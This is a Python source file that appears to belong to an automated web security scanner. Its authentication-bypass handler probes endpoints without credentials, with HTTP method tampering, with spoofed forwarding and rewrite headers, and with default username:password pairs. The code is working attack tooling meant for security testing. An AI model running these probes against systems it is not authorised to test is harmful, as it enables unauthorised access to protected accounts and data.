"""Authentication bypass attack handler.

Probes protected endpoints using several techniques: direct access
without credentials, HTTP method tampering, header manipulation, and
default credential stuffing.
"""

from __future__ import annotations

import re

import requests

from src.executor.base import AttackHandler
from src.infra.decorators import retry
from src.infra.logging import get_logger
from src.models import AttackVector, SingleAttackResult

logger = get_logger(__name__)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

_TAMPER_METHODS = ("GET", "POST", "PUT", "HEAD", "OPTIONS")

_BYPASS_HEADERS_SETS: list[dict[str, str]] = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Forwarded-For": "127.0.0.1", "X-Original-URL": "/admin"},
]

_ADMIN_INDICATORS = re.compile(
    r"(admin|dashboard|configuration|settings|user.?list|\"role\"\s*:\s*\"admin\")",
    re.IGNORECASE,
)


class AuthBypassHandler(AttackHandler):
    """Test authentication and authorization bypass.

    Strategies (executed in order, first success wins):

    1. **Direct access** -- GET the protected endpoint without auth.
    2. **Method tampering** -- Try different HTTP methods; some apps
       only enforce auth on the expected method.
    3. **Header manipulation** -- Add forwarded-for / rewrite headers
       that may trick reverse-proxy auth checks.
    4. **Default credentials** -- If the target is a login endpoint,
       try common defaults extracted from the payload.
    """

    attack_type = "auth_bypass"

    # ------------------------------------------------------------------
    # helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _looks_like_admin_data(body: str) -> bool:
        """Return True if the body seems to contain admin / config data."""
        return bool(_ADMIN_INDICATORS.search(body))

    @staticmethod
    def _parse_credentials(payload: str) -> tuple[str, str] | None:
        """Extract ``(user, password)`` from a payload like ``admin:admin``."""
        if ":" in payload:
            parts = payload.split(":", 1)
            return parts[0].strip(), parts[1].strip()
        return None

    # ------------------------------------------------------------------
    # public API
    # ------------------------------------------------------------------

    @retry(max_attempts=2, base_delay=0.5, exceptions=(requests.ConnectionError, requests.Timeout))
    def test(self, vector: AttackVector, payload: str) -> SingleAttackResult:
        """Execute authentication bypass tests against the target."""
        endpoint = vector.target_endpoint
        logger.debug("[AUTH_BYPASS] %s <- %s", endpoint, payload)

        # --- Strategy 1: Direct access without auth ---
        try:
            resp = self.session.get(endpoint)
        except requests.RequestException as exc:
            logger.error("Request failed for auth bypass: %s", exc)
            return self._make_result(
                vector,
                payload,
                status=0,
                snippet=str(exc),
                success=False,
                detection=f"Connection error: {exc}",
            )

        if resp is None:
            return self._make_result(
                vector,
                payload,
                status=0,
                snippet="No response received",
                success=False,
                detection="Connection error: no response from target",
            )

        body = resp.text
        if resp.status_code == 200 and self._looks_like_admin_data(body):
            detection = "Admin/protected endpoint accessible without authentication (HTTP 200)"
            logger.info("[AUTH_BYPASS] SUCCESS (direct) on %s", endpoint)
            return self._make_result(
                vector,
                payload,
                status=resp.status_code,
                snippet=body[:200],
                success=True,
                detection=detection,
            )

        # --- Strategy 2: HTTP method tampering ---
        original_method = "GET"
        for method in _TAMPER_METHODS:
            if method == original_method:
                continue
            try:
                resp_m = self.session.request(method, endpoint)
            except requests.RequestException:
                continue

            if resp_m is None:
                continue

            if resp_m.status_code == 200 and self._looks_like_admin_data(resp_m.text):
                detection = (
                    f"Method bypass: {method} returned 200 with admin data on protected endpoint"
                )
                logger.info("[AUTH_BYPASS] SUCCESS (method=%s) on %s", method, endpoint)
                return self._make_result(
                    vector,
                    payload,
                    status=resp_m.status_code,
                    snippet=resp_m.text[:200],
                    success=True,
                    detection=detection,
                )

        # --- Strategy 3: Header manipulation ---
        for extra_headers in _BYPASS_HEADERS_SETS:
            try:
                resp_h = self.session.get(endpoint, headers=extra_headers)
            except requests.RequestException:
                continue

            if resp_h is None:
                continue

            if resp_h.status_code == 200 and self._looks_like_admin_data(resp_h.text):
                header_names = ", ".join(extra_headers.keys())
                detection = (
                    f"Header bypass: endpoint returned admin data with "
                    f"injected headers ({header_names})"
                )
                logger.info("[AUTH_BYPASS] SUCCESS (headers=%s) on %s", header_names, endpoint)
                return self._make_result(
                    vector,
                    payload,
                    status=resp_h.status_code,
                    snippet=resp_h.text[:200],
                    success=True,
                    detection=detection,
                )

        # --- Strategy 4: Default credentials ---
        creds = self._parse_credentials(payload)
        if creds is not None:
            username, password = creds
            login_body = {"username": username, "password": password}

            # Also try with field names from the vector
            if vector.target_fields:
                login_body = {}
                for i, field in enumerate(vector.target_fields):
                    login_body[field] = username if i == 0 else password

            try:
                resp_c = self.session.post(endpoint, json=login_body)
            except requests.RequestException as exc:
                logger.debug("Default creds POST failed: %s", exc)
                resp_c = None

            if resp_c is not None and resp_c.status_code == 200:
                cred_body = resp_c.text.lower()
                if any(
                    kw in cred_body for kw in ("token", "session", "auth", "welcome", "success")
                ):
                    detection = (
                        f"Default credentials accepted: {username}:*** returned "
                        f"authentication token/session"
                    )
                    logger.info("[AUTH_BYPASS] SUCCESS (default creds) on %s", endpoint)
                    return self._make_result(
                        vector,
                        payload,
                        status=resp_c.status_code,
                        snippet=resp_c.text[:200],
                        success=True,
                        detection=detection,
                    )

        # --- No bypass detected ---
        logger.debug("[AUTH_BYPASS] FAIL on %s", endpoint)
        return self._make_result(
            vector,
            payload,
            status=resp.status_code,
            snippet=body[:200],
            success=False,
            detection="No authentication bypass detected",
        )
